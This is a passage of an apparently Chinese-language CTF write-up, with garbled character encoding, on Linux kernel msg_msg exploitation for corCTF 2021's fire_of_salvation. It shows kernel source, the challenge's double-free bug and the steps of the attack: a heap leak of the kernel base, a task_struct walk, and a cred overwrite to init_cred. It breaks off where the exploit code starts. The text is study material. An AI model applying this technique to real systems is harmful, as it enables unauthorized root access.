class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_receiver</span> <span class="title">msr_d</span>;</span></span><br><span class="line"></span><br><span class="line">		msg = ERR_PTR(-EACCES);</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			msg = ERR_PTR(-EIDRM);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list);</span><br><span class="line">			msq-&gt;q_qnum--;</span><br><span class="line">			msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">			ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">			msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">			atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">			atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">			ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* No message waiting. Wait for a message */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			msg = ERR_PTR(-ENOMSG);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		list_add_tail(&amp;msr_d.r_list, &amp;msq-&gt;q_receivers);</span><br><span class="line">		msr_d.r_tsk = current;</span><br><span class="line">		msr_d.r_msgtype = msgtyp;</span><br><span class="line">		msr_d.r_mode = mode;</span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; MSG_NOERROR)</span><br><span class="line">			msr_d.r_maxsize = INT_MAX;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			msr_d.r_maxsize = bufsz;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not require due to ipc_lock_object() */</span></span><br><span class="line">		WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN));</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not required, we own ipc_lock_object() */</span></span><br><span class="line">		__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 1:</span></span><br><span class="line"><span class="comment">		 * We don&#x27;t hold a reference to the queue and getting a</span></span><br><span class="line"><span class="comment">		 * reference would defeat the idea of a lockless operation,</span></span><br><span class="line"><span class="comment">		 * thus the code relies on rcu to guarantee the existence of</span></span><br><span class="line"><span class="comment">		 * msq:</span></span><br><span class="line"><span class="comment">		 * Prior to destruction, expunge_all(-EIRDM) changes r_msg.</span></span><br><span class="line"><span class="comment">		 * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		rcu_read_lock();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 2:</span></span><br><span class="line"><span class="comment">		 * The work in pipelined_send() and expunge_all():</span></span><br><span class="line"><span class="comment">		 * - Set pointer to message</span></span><br><span class="line"><span class="comment">		 * - Queue the receiver task for later wakeup</span></span><br><span class="line"><span class="comment">		 * - Wake up the process after the lock is dropped.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * Should the process wake up before this wakeup (due to a</span></span><br><span class="line"><span class="comment">		 * signal) it will either see the message and continue ...</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN)) &#123;</span><br><span class="line">			<span class="comment">/* see MSG_BARRIER for purpose/pairing */</span></span><br><span class="line">			smp_acquire__after_ctrl_dep();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 <span class="comment">/*</span></span><br><span class="line"><span class="comment">		  * ... or see -EAGAIN, acquire the lock to check the message</span></span><br><span class="line"><span class="comment">		  * again.</span></span><br><span class="line"><span class="comment">		  */</span></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		msg = READ_ONCE(msr_d.r_msg);</span><br><span class="line">		<span class="keyword">if</span> (msg != ERR_PTR(-EAGAIN))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		list_del(&amp;msr_d.r_list);</span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			msg = ERR_PTR(-ERESTARTNOHAND);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="msgåˆ©ç”¨"><a href="#msgåˆ©ç”¨" class="headerlink" title="msgåˆ©ç”¨"></a>msgåˆ©ç”¨</h2><p>åªè¦èƒ½æ§åˆ¶äº†msg_msgåç¡®å®å¯ä»¥è¾¾åˆ°ä»»æ„åœ°å€å†™å’Œä»»æ„åœ°å€è¯»ï¼Œè€Œä¸”å †å—èŒƒå›´æ˜¯<code>0x40~0x1000</code>,æ„Ÿè§‰éå¸¸å¥½ç”¨ã€‚</p>
<p>æœ¬æ–‡é€šè¿‡<code>corCTF 2021</code>ä¸¤é“å†…æ ¸é¢˜å­¦ä¹ å¯¹msg_msgçš„åˆ©ç”¨ã€‚åº”è¯¥ä¼šå¾ˆæœ‰éš¾åº¦ï¼Œé¢„è®¡å¤ç°è‡³å°‘ä¸¤å¤©ã€‚(çœ‹å®Œæ•´ä¸ªè§£é¢˜æ€è·¯å’Œé•¿è¾¾400å¤šè¡Œä»¥åŠ700å¤šè¡Œçš„exp,ğŸ¤¦â€â™€ï¸åäº†ï¼Œä¸åªæ˜¯éœ€è¦ä¸¤å¤©äº†ã€‚è‡³å°‘ä¸€å‘¨æˆ–è€…æ›´ä¹…ã€‚ã€‚ã€‚</p>
<h3 id="fire-of-salvation"><a href="#fire-of-salvation" class="headerlink" title="fire_of_salvation"></a>fire_of_salvation</h3><p>é¢˜ç›®ç»™äº†æºä»£ç ååˆ†å¥½å®¡è®¡ï¼Œä¸»è¦ç»“æ„ä½“å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> EASY_MODE</span></span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">rule_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><p>æ¼æ´å‡ºç°åœ¨äº†dup()å‡½æ•°ä¸‹ï¼Œåœ¨å…¨å±€æŒ‡é’ˆæ•°ç»„ä¸­å¯ä»¥å­˜å‚¨ä¸¤æ¬¡æŒ‡å‘åŒä¸€ä¸ªå †å—çš„æŒ‡é’ˆï¼Œè¿™å¯¼è‡´å¯ä»¥é‡Šæ”¾ä¸¤æ¬¡åŒä¸€ä¸ªå †å—ï¼Œæ—¢å¯ä»¥doublefreeåˆå¯ä»¥uaf.</p>
<h4 id="å¡«å‘"><a href="#å¡«å‘" class="headerlink" title="å¡«å‘"></a>å¡«å‘</h4><p>ä»¤äººæ„Ÿå¹ï¼Œè·ç¦»å†™ä¸‹ä¸Šä¸€æ®µè¯åˆ°ç°åœ¨å·²ç»è¿‡äº†åŠä¸ªæœˆäº†ï¼Œç¡®å®æ‡’ç‹—äº†è¿™ä¸‹ï¼Œæœ¬æ¥æƒ³ç€å­¦å®Œmit6.s081åå†ç»§ç»­å­¦ä¹ äºŒè¿›åˆ¶çš„ï¼Œä½†æ˜¯è‚äº†ä¸€å‘¨äº†æœ‰ç‚¹è‚ä¸åŠ¨äº†ï¼Œå‰é¢è¿˜å¥½è¯´ï¼Œåé¢çš„è¯¾ç¡®å®æ²¾ç‚¹éš¾åº¦äº†ï¼Œä¸€ä¸ªåŠå°æ—¶çš„è¯¾æˆ‘å¾—çœ‹ä¸‰ä¸ªå°æ—¶æ‰èƒ½å•ƒä¸‹æ¥ï¼Œæƒ³èµ·äº†<code>msg</code>è¿˜æ²¡å­¦å®Œï¼Œé‚£å°±æ¢ä¸ªä¸œè¥¿æŠ˜ç£¨æˆ‘å§ã€‚</p>
<h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>ç”±äºå¼€å¯äº†kaslrå’Œfg_kaslr,æ‰€ä»¥è‚¯å®šå¾—å…ˆè·å–å†…æ ¸åœ°å€ï¼Œä½†æ˜¯æ³¨æ„ç”±äºå¼€å¯äº†<code>fg_kaslr</code>ä¹‹åå°±æ²¡æœ‰é‚£ä¹ˆç®€å•äº†ï¼Œ<code>fg_kaslr</code>ä¼šåœ¨<code>kaslr</code>ä¸Šä»¥å‡½æ•°ç²’åº¦å¯¹åœ°å€å†è¿›ä¸€æ­¥æ‰“ä¹±ï¼Œè¿™ä¸ªæ‰“ä¹±ä¹Ÿæ˜¯éšæœºçš„ï¼Œæ‰€ä»¥å‡½æ•°åˆ°å†…æ ¸åŸºåœ°å€çš„åç§»æ˜¯éšæ—¶å‘ç°å˜åŒ–çš„ï¼Œä½†æ˜¯<code>fg_kaslr</code>æœ‰äº›åŒºåŸŸä¸ä¼šè¢«æ‰“ä¹±</p>
<blockquote>
<p>1..textæ®µ</p>
<p>2.dataæ®µ</p>
<p>3.__ksymtab</p>
</blockquote>
<p>çŸ¥é“äº†ä¸Šé¢åŒºåŸŸçš„ä¸€äº›åœ°å€å°±å¯ä»¥çŸ¥é“å†…æ ¸çš„åŸºåœ°å€äº†ã€‚åœ¨è¿™é“é¢˜ä¸­é€‰æ‹©ä½¿ç”¨<code>shm_file_data</code>ç»“æ„ä½“æ¥æ³„éœ²å†…æ ¸dataæ®µåœ°å€è¿›è€ŒçŸ¥é“å†…æ ¸åŸºåœ°å€ã€‚å…¶ä¸­<code>ipc_namespace</code>å°±æŒ‡å‘å†…æ ¸dataæ®µã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ³„éœ²åœ°å€å¯ä»¥åˆ†ä¸ºä¸€ä¸‹å‡ æ­¥</p>
<ul>
<li>1.é¦–å…ˆæ„é€ ä¸€ä¸ª4kbçš„uafç„¶åç”³è¯·ä¸€ä¸ª<code>0xfd8</code>å¤§å°çš„<code>msg_msg</code>ï¼Œæ­¤æ—¶<code>msg</code>ç»“æ„ä½“å¦‚ä¸‹å›¾</li>
</ul>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20221017001913589.png" alt="image-20221017001913589"></p>
<ul>
<li>2.å †å–·ï¼Œè¿™æ ·<code>shm_file_data</code>å°±å¯èƒ½è½åˆ°<code>struct msg_msg</code>ä¸‹é¢äº†</li>
<li>3.åˆ©ç”¨<code>uaf</code>ä¿®æ”¹<code>m_ts</code>ï¼Œè¿™ä¸ªå˜é‡è®°å½•äº†è¿™ä¸ªæ¶ˆæ¯çš„å¤§å°ï¼Œæ”¹å¤§ä¹‹åå†<code>MSG_COPY</code>è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å°±å¯ä»¥å¯ä»¥å¾—åˆ°<code>struct msg_msg</code>åé¢çš„å †çš„ä¿¡æ¯äº†ï¼Œä¹Ÿå°±å¾—åˆ°äº†å†…æ ¸åŸºåœ°å€ã€‚</li>
<li>4.åˆ©ç”¨åŸºåœ°å€å°±å¯ä»¥ç®—å‡º<code>init_cred</code>å’Œ<code>init_task</code>äº†ï¼Œè¿™ä¸¤ä¸ªç»“æ„ä½“éƒ½åœ¨å†…æ ¸dataæ®µä¸­ï¼Œå¯ä»¥ç›´æ¥ç®—å‡ºã€‚</li>
</ul>
<p>å¾—åˆ°ä¸Šé¢çš„åœ°å€å°±å¯ä»¥åˆ©ç”¨<code>init_task</code>æ¥æ‰¾åˆ°è¿™ä¸ªè¿›ç¨‹çš„<code>task_struct</code>äº†ã€‚</p>
<p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ª<code>task_struct</code>ï¼Œå†…æ ¸ä½¿ç”¨åŒå‘å¾ªç¯è¡¨æ¥ç»„ç»‡è¿™ä¸ªç»“æ„ä½“ï¼Œå­—æ®µä¸º<code>struct list_head        tasks;</code></p>
<p>ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥é€šè¿‡<code>init_task</code>çš„<code>prev</code>å‘ä¸Šå¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°è¿™ä¸ªè¿›ç¨‹çš„<code>task_struct</code>ã€‚</p>
<p>è¯´ç™½äº†å°±æ˜¯é€šè¿‡ä¿®æ”¹<code>msg</code>çš„<code>next</code>å­—æ®µå®Œæˆä»»æ„è¯»æ“ä½œï¼Œå…³é”®æ˜¯å¦‚ä½•æ„é€ <code>msg</code>äº†ï¼Œä¸‹é¢æ˜¯ä½œè€…ç»™å‡ºçš„æ„é€ ç¤ºæ„å›¾ï¼Œæˆ‘ä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªè¿›è¡Œæ„é€ çš„ï¼Œæˆ‘ä»¬å¾—è¦†ç›–<code>next</code>è®©å…¶æŒ‡å‘<code>task_struct</code>çš„æŸä¸€ä¸ªåœ°æ–¹ï¼Œç„¶åå†è¯»è¿™ä¸ª<code>task_struct</code>ï¼Œä½†æ˜¯å¯¹<code>next</code>çš„è¦†ç›–æ˜¯æœ‰è¦æ±‚çš„ï¼Œä»–æ‰€æŒ‡å‘çš„åœ°å€çš„å‰å…«ä¸ªå­—èŠ‚å¿…é¡»ä¸ºç©ºï¼Œä¸ç„¶è¯»å–å’Œå†™å…¥çš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œå…·ä½“åŸå› çœ‹çœ‹æºç å°±æ‡‚äº†ã€‚</p>
<p>å…¶ä¸­<code>struct list_head        tasks</code>åœ¨ä½äº<code>task_struct</code>çš„0x298åç§»å‡ºï¼Œå…¶å‰å…«ä¸ªå­—èŠ‚åˆšå¥½æ˜¯<code>null</code>,æ‰€ä»¥å¯ä»¥è®©<code>next</code>æŒ‡å‘<code>task_struct_addr+0x290</code>å¤„ã€‚è¿™æ ·å°±å¯ä»¥è¯»åˆ°<code>task_struct</code>çš„<code>prev</code>å’Œ<code>pid</code>äº†ï¼Œpidä½äº<code>task_struct</code>çš„0x398å¤„ï¼Œç„¶åæ•´ä¸€ä¸ªå¾ªç¯è¯»åˆ°å½“å‰è¿›ç¨‹çš„<code>task_struct</code>äº†ã€‚</p>
<p><img src="https://1.bp.blogspot.com/-Y-YqvmgaX1U/YSggQhwb5pI/AAAAAAAACIc/leKw-FMmY_8TuX-rqv_H0Get2kT3NFEEACLcBGAsYHQ/w640-h426/3.png" alt="img"></p>
<p>æ³¨æ„<code>prev</code>å¹¶ä¸æŒ‡å‘ä¸Šä¸€ä¸ªè¿›ç¨‹çš„<code>task_struct</code>çš„å¼€å¤´ï¼Œè€Œæ˜¯æŒ‡å‘å…¶ä¸­çš„å­—æ®µ<code>struct list_head tasks</code>ï¼Œæ‰€ä»¥å‡å»0x298å°±å¾—åˆ°å½“å‰<code>task_struct</code>çš„åŸºåœ°å€äº†ã€‚</p>
<p>å¾—åˆ°å½“å‰è¿›ç¨‹<code>task_struct</code>çš„åŸºåœ°å€åå°±å¾—æ„é€ ä»»æ„åœ°å€å†™æ¥å®Œæˆå¯¹å½“å‰è¿›ç¨‹<code>task_struct</code>ä¸­çš„<code>real_cred å’Œ cred</code>æŒ‡é’ˆçš„è¦†å†™ï¼Œè¦†å†™æˆ<code>init_cred</code>æŒ‡é’ˆã€‚</p>
<p>é¦–å…ˆè€ƒè™‘<code>msg</code>çš„<code>next</code>åº”è¯¥æŒ‡å‘å“ªé‡Œï¼Œ<code>read_cred</code>å’Œ<code>cred</code>å¯¹äº<code>task_struct</code>çš„åç§»æ˜¯0x538å’Œ0x540ã€‚<code>real_cred</code>çš„å‰å…«ä¸ªå­—èŠ‚åˆšå¥½è¿˜æ˜¯<code>null</code>,æ‰€ä»¥å¯ä»¥è®©<code>next</code>æŒ‡å‘<code>task_struct+0x538-0x8</code>.</p>
<p><img src="https://1.bp.blogspot.com/-MhE76o_slr0/YSfwYpL-e-I/AAAAAAAACIQ/-ThXZ-1XlH4-hQJzKbxsJazF73c8g_SWQCLcBGAsYHQ/w640-h402/4.png" alt="img"></p>
<p>åªè¦è€ƒè™‘æ¸…æ¥š<code>next</code>çš„çš„å–å€¼é—®é¢˜ï¼Œä»»æ„åœ°å€å†™å°±æ˜¯å¥—<code>userfaulted</code>çš„æ¿å­äº†,æ­¥éª¤å¦‚ä¸‹</p>
<ul>
<li>å…ˆmmapä¸€æ®µox2000çš„å†…å­˜ï¼Œç„¶ååœ¨0x1000-0x8å¤„å¡«ä¸Šmtype,æŠŠ0x1000æ³¨å†Œç¼ºé¡µå¤„ç†ï¼Œç„¶å<code>send_msg(msg_id, msg_buff, size - 0x30, 0);</code></li>
<li>å½“msgè¿›å…¥ç¼ºé¡µå¤„ç†å‡½æ•°çš„æ—¶å€™ï¼Œå‡†å¤‡å¥½<code>page</code>,å…¶<code>0xfd0</code>å’Œ<code>0xfd8</code>å¤„å‡†å¤‡å¥½<code>init_cred</code>ï¼Œç„¶ååˆ©ç”¨è®¾å¤‡çš„editä¿®æ”¹<code>msg</code>çš„nextæŒ‡é’ˆ</li>
</ul>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span 